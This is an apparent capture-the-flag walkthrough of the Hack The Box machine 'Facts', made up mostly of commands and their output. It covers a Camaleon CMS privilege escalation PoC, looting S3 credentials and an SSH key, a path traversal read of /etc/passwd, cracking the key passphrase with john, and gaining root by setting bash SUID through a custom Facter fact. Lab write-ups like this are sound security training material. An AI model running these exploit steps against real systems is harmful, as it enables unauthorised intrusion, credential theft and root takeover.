![facts.png](facts.png)

# Facts

## Enum

```bash
nmap -sC -sV -oN scans/nmap.initial 10.129.27.32
```
```bash
nmap -Pn -p- --min-rate 10000 -v -oN scans/nmap.allports facts.htb
```
```bash
dirsearch -q -x 404 -u http://facts.htb/
[23:41:46] 200 -    7KB - http://facts.htb/400
[23:41:46] 200 -    5KB - http://facts.htb/404
[23:41:46] 200 -    5KB - http://facts.htb/404.html
[23:41:46] 200 -    8KB - http://facts.htb/500
[22:57:33] 200 -    99B - /robots.txt
[22:57:44] 200 -    73B - /up.php
```

```bash
http://facts.htb/welcome
http://facts.htb/search
http://facts.htb/search?q=cat
http://facts.htb/randomfacts/logopage.png
```

```bash
ffuf -c \
  -w /usr/share/seclists-git/Discovery/DNS/namelist.txt \
  -o ./scans/ffuf.vhosts \
  -of all \
  -u "http://facts.htb" \
  -H "Host: FUZZ.facts.htb" \
  -fs 154
```

```bash
feroxbuster -q \
  --url http://facts.htb/ \
  -w /usr/share/seclists-git/Discovery/Web-Content/big.txt \
  -o scans/ferox.out \
  -W 371
```

```bash
http://facts.htb/admin/forgot
http://facts.htb/admin/register
```

We can register an account on the admin page and get the version of Camaleon CMS running
```bash
camaleon cms 2.9.0
```

## CVE-2025-2304 Camaleon 2.9.0 Privilege Escalation to Admin

Found a PoC to escalate our privileges to Admin in Camaleon CMS
```bash
git clone https://github.com/whiteov3rflow/CVE-2025-2304-POC.git
```
```bash
python3 exploit.py http://facts.htb asdf asdf
```

In the settings of the web-portal we find s3 credentials
```bash
access-key: AKIA4878E4AD66EA56B7
secret-key: 4IEpAJpKkDITlrTyKiTQ6AxdAQjDqYABqNS1U1Gk
bucket-name: randomfacts
s3-region: us-east-1
bucket-endpoint: http://localhost:54321
cloudfront-url: http://facts.htb/randomfacts
```

Install and configure aws-cli
```bash
yay -S aws-cli
aws configure
AWS Access Key ID [None]: AKIA4878E4AD66EA56B7
AWS Secret Access Key [None]: 4IEpAJpKkDITlrTyKiTQ6AxdAQjDqYABqNS1U1Gk
Default region name [None]: us-east-1
Default output format [None]:
```

```bash
cat .aws/config
[default]
endpoint_url = http://facts.htb:54321
region = us-east-1
```

```bash
cat ~/.aws/credentials
[default]
aws_access_key_id = AKIA1F5761D60E4D4119
aws_secret_access_key = w1hb88JzPpfew/8QKXwfDMauxP3t40ONuOw/Oide
```

```bash
aws s3 ls
2025-09-11 12:06:52 internal
2025-09-11 12:06:52 randomfacts
```

Got a warning, there's a new version of the aws cli apparently, so I'm gettingthat 
```bash
sudo pacman -S aws-cli-v2
aws --version
aws-cli/2.32.32 Python/3.14.2 Linux/6.18.7-arch1-Watanare-T2-1-t2 source/x86_64.arch
```

Looting the buckets 
```bash
aws s3 ls s3://internal
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 18:45:13        220 .bash_logout
2026-01-08 18:45:13       3900 .bashrc
2026-01-08 18:47:17         20 .lesshst
2026-01-08 18:47:17        807 .profile
```

```bash
aws s3 cp --recursive s3://internal/.ssh/ .
download: s3://internal/.ssh/authorized_keys to ./authorized_keys
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
```

There's a private key and the authorized key corresponds
```bash
ssh-keygen -l -f .ssh/authorized_keys
256 SHA256:im8vIhzqQqXnTRMBK5dG+zshG/J5sEiv+ftAfyZYpsg no comment (ED25519)
```

```bash
ssh-keygen -l -f .ssh/id_ed25519 2>/dev/null
256 SHA256:im8vIhzqQqXnTRMBK5dG+zshG/J5sEiv+ftAfyZYpsg no comment (ED25519)
```

At this stage I tried to connect as bob, carol, dave, admin, editor, and all kinds of things that could make sense, without success.

Even attempted to bruteforce usernames
```bash
nmap \
  -p 22 \
  --script ssh-brute \
  --script-args "userdb=/usr/share/seclists-git/Usernames/Names/names.txt,ssh-brute.keyfile=/home/blnkn/sec/htb/machines/facts/loot/internal/.ssh/id_ed25519" \
  facts.htb
```

But we get limited by PAM probably pretty quick
```bash
nc facts.htb 22
Not allowed at this time
```

## CVE-2025-62506 Minio Privesc (Red Hering)

The server side of this blob store is minio
```bash
curl -I http://facts.htb:54321
HTTP/1.1 400 Bad Request
Accept-Ranges: bytes
Content-Length: 213
Content-Type: application/xml
Server: MinIO
Vary: Origin
Date: Mon, 02 Feb 2026 16:48:49 GMT
```

Installing and configuring the minio cli
```bash
mcli alias set facts http://facts.htb:54321 AKIABB4E6613FF38719E liew/et6ulTnpOCG65RJUFBhf9PGTc4F/eO6EvLo
```

```bash
jq .aliases.facts ~/.mcli/config.json
{
  "url": "http://facts.htb:54321",
  "accessKey": "AKIA974B6D1D90C3058B",
  "secretKey": "Mbjss3MkfDCCLHuaMlBDkRvautQ+Lc0GyT4EzAjP",
  "api": "s3v4",
  "path": "auto"
}
```

Eventually we're able to find the exact version of minio running
```bash
mcli admin info facts
●  facts.htb:54321
   Uptime: 50 minutes
   Version: 2025-09-07T16:13:09Z
   Network: 1/1 OK
   Drives: 1/1 OK
   Pool: 1

┌──────┬────────────────────────┬─────────────────────┬──────────────┐
│ Pool │ Drives Usage           │ Erasure stripe size │ Erasure sets │
│ 1st  │ 72.6% (total: 7.2 GiB) │ 1                   │ 1            │
└──────┴────────────────────────┴─────────────────────┴──────────────┘

36 MiB Used, 2 Buckets, 2,077 Objects
1 drive online, 0 drives offline, EC:0
```

And it is vulnerable to `CVE-2025-62506` unfortunately that's not giving us access to any extra buckets or anything, so I don't thinkg that's really helpful to us at this time... Probably just a red-hering.
```bash
python verify_cve_2025_62506.py
...
```

## CVE-2024-46987 Arbitrary File Read

It's time to reassess the situation. An arbitrary file read would be nice, if I could just get /etc/passwd and know what users are on the box I would surely be able to log-in. And I'm pretty sure I saw some kind of arbitrary file read for camaleon while googling around for CVEs.

I eventually found here in the [github advisory](https://github.com/advisories/GHSA-cp65-5m9r-vc2c) that and authenticated user can simply navigated to `download_private_file` and do path traversal in the `file` param. I'm pretty sure I saw that before, I guess I just skipped it because the advisory says `Affected versions < 2.8.1` also maybe I wasn't an authenticated user yet when I checked. Later I also found that I just had to to hit show more in the [vulners article](https://vulners.com/githubexploit/5BEA2FBA-F991-5925-A9FC-6F664099897B) to get a helper script... I guess I really need to spend more than 3 sec per pages sometimes.

But we don't really need a script like...
```bash
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

Now we know trivia and william exist on the box.
```bash
grep sh$ passwd
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

## Cracking the Encrypted Key

At this point I try to login to trivia with the key I have, and "fail successfully" a little further... Noice.
```bash
ssh -i id_ed25519 -o "IdentitiesOnly=yes" trivia@facts.htb
Enter passphrase for key 'id_ed25519':
```

So the key is encrypted, crack it.
```bash
yay -S john-git
ssh2john id_ed25519 > hash.txt
john --wordlist=/usr/share/seclists-git/Passwords/Leaked-Databases/rockyou.txt hash.txt
john --show hash.txt
```

And finally log-in.
```bash
ssh -v -i id_ed25519 -o "IdentitiesOnly=yes" trivia@facts.htb
```

```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Get the user flag in william's home
```bash
trivia@facts:~$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
trivia@facts:~$ cd /home/
trivia@facts:/home$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 Jan  8 17:53 .
drwxr-xr-x 20 root    root    4096 Jan 28 15:15 ..
drwxr-x---  6 trivia  trivia  4096 Jan 28 16:17 trivia
drwxr-xr-x  2 william william 4096 Jan 26 11:40 william
trivia@facts:/home$ cd william/
trivia@facts:/home/william$ wc -c user.txt
33 user.txt
```

## Use Facter as a GTFO Bin

We can run facter as root
```bash
trivia@facts:/home/william$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

```bash
trivia@facts:~$ sudo /usr/bin/facter --version
4.10.0
```

```bash
sudo /usr/bin/facter --json
wl-paste > facter.json
```

Facter is a GTFO bin, with a bit of tinkering we can get it to load a script.
```bash
cat /dev/shm/bork.rb
Facter.add(:its_factual) do setcode { system("chmod +s /bin/bash") } end
```

```bash
sudo /usr/bin/facter --custom-dir=/dev/shm/ its_factual
true
```

```bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash
```

```bash
bash -p
```

```bash
```

```bash
```


